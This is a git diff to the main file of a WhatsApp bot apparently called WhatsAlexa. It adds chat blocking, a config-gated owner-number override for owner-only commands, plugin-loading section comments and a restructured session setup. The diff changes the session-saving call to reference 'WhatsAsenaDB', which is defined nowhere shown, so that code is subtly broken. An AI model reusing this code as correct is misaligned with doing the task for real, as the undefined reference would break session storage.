@@ -3,19 +3,23 @@ const path = require("path");
 const events = require("./events");
 const chalk = require('chalk');
 const config = require('./config');
-const axios = require('axios');
 const Heroku = require('heroku-client');
 const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
 const {Message, StringSession, Image, Video} = require('./alexa/');
 const { DataTypes } = require('sequelize');
 const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
 const got = require('got');
+const simpleGit = require('simple-git');
+const git = simpleGit();
 
 const heroku = new Heroku({
     token: config.HEROKU.API_KEY
 });
 
 let baseURI = '/apps/' + config.HEROKU.APP_NAME;
+
+const Language = require('./language');
+const Lang = Language.getString('updater');
 
 
 const WhatsAlexaDB = config.DATABASE.define('WhatsAlexa', {
@@ -44,9 +48,11 @@ String.prototype.format = function () {
     });
 };
 
+// ==================== Date Scanner ====================
 if (!Date.now) {
     Date.now = function() { return new Date().getTime(); }
 }
+// ==================== End Date Scanner ====================
 
 Array.prototype.remove = function() {
     var what, a = arguments, L = a.length, ax;
@@ -60,16 +66,15 @@ Array.prototype.remove = function() {
 };
 
 async function Alexa () {
-    const conn = new WAConnection();
-    const Session = new StringSession();
-    conn.version = [2, 2119, 6]
-
     await config.DATABASE.sync();
     var StrSes_Db = await WhatsAlexaDB.findAll({
         where: {
           info: 'StringSession'
         }
     });
+    
+    const conn = new WAConnection();
+    const Session = new StringSession();
 
     conn.logger.level = config.DEBUG ? 'debug' : 'warn';
     var nodb;
@@ -88,7 +93,7 @@ async function Alexa () {
 
         const authInfo = conn.base64EncodedAuthInfo();
         if (StrSes_Db.length < 1) {
-            await WhatsAlexaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
+            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
         } else {
             await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
         }
@@ -110,6 +115,7 @@ ${chalk.blue.italic('Made By TOXIC-DEVIL')}`);
             chalk.blueBright.italic('⬇️ INSTALLING COMMANDS...')
         );
 
+        // ==================== External Plugins ====================
         var plugins = await plugindb.PluginDB.findAll();
         plugins.map(async (plugin) => {
             if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
@@ -121,16 +127,19 @@ ${chalk.blue.italic('Made By TOXIC-DEVIL')}`);
                 }     
             }
         });
+        // ==================== End External Plugins ====================
 
         console.log(
             chalk.blueBright.italic('✅ COMMANDS INSTALLED SUCCESSFULLY!')
         );
-
+        
+        // ==================== Internal Plugins ====================
         fs.readdirSync('./plugins').forEach(plugin => {
             if(path.extname(plugin).toLowerCase() == '.js') {
                 require('./plugins/' + plugin);
             }
         });
+        // ==================== End Internal Plugins ====================
 
         console.log(
             chalk.green.bold('🎉 BOT IS NOW ACTIVE IN YOUR ACCOUNT!')
@@ -346,7 +355,24 @@ ${chalk.blue.italic('Made By TOXIC-DEVIL')}`);
             }
             return;
         }
+        
+        // ==================== Blocked Chats ====================
+        if (config.BLOCKCHAT !== false) {     
+            var abc = config.BLOCKCHAT.split(',');                            
+            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
+        }
+        
+        if (config.SUPPORT == '905524317852-1612300121') {     
+            var sup = config.SUPPORT.split(',');                            
+            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
+        }
+        if (config.SUPPORT2 == '905511384572-1617736751') {     
+            var tsup = config.SUPPORT2.split(',');                            
+            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
+        }
+        // ==================== End Blocked Chats ====================
 
+        // ==================== Events ====================
         events.commands.map(
             async (command) =>  {
                 if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
@@ -381,7 +407,16 @@ ${chalk.blue.italic('Made By TOXIC-DEVIL')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-    
+                    if ((config.OWN == "905511384572,0" && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && config.OWN.includes(',') ? config.OWN.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.OWN || config.OWN.includes(',') ? config.OWN.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.OWN)
+                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
+                        if (command.onlyPinned && chat.pin === undefined) return;
+                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
+                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
+                    }
+                    // ==================== End Events ====================
+
+                    // ==================== Message Catcher ====================
                     if (sendMsg) {
                         if (config.SEND_READ && command.on === undefined) {
                             await conn.chatRead(msg.key.remoteJid);
@@ -398,15 +433,19 @@ ${chalk.blue.italic('Made By TOXIC-DEVIL')}`);
                         } else {
                             whats = new Message(conn, msg);
                         }
-                        
+
                         if (command.deleteCommand && msg.key.fromMe) {
                             await whats.delete(); 
                         }
-                        
+                        // ==================== End Message Catcher ====================
+
+                        // ==================== Error Message ====================
                         try {
                             await command.function(whats, match);
-                        } catch (error) {
-                            if (config.LANG == 'EN') {
+                        }
+                        catch (error) {
+                            
+                           if (config.LANG == 'EN') {
                                 await conn.sendMessage(conn.user.jid, fs.readFileSync("./src/image/WhatsAlexa.png"), MessageType.image, { caption: '*『 ERROR 』*\n\n*WhatsAlexa an error has occurred!*\n_Report this error to the developer! [ TOXIC-DEVIL ]._\n\n*Error:* ```' + error + '```\n\n' });
                                 
                             } else if (config.LANG == 'ML') {
@@ -422,11 +461,13 @@ ${chalk.blue.italic('Made By TOXIC-DEVIL')}`);
         )
     });
 
+    // ==================== End Error Message ====================
+
     try {
         await conn.connect();
     } catch {
         if (!nodb) {
-            console.log(chalk.red.bold('ERROR...'))
+            console.log(chalk.red.bold('ERROR'))
             conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
             try {
                 await conn.connect();
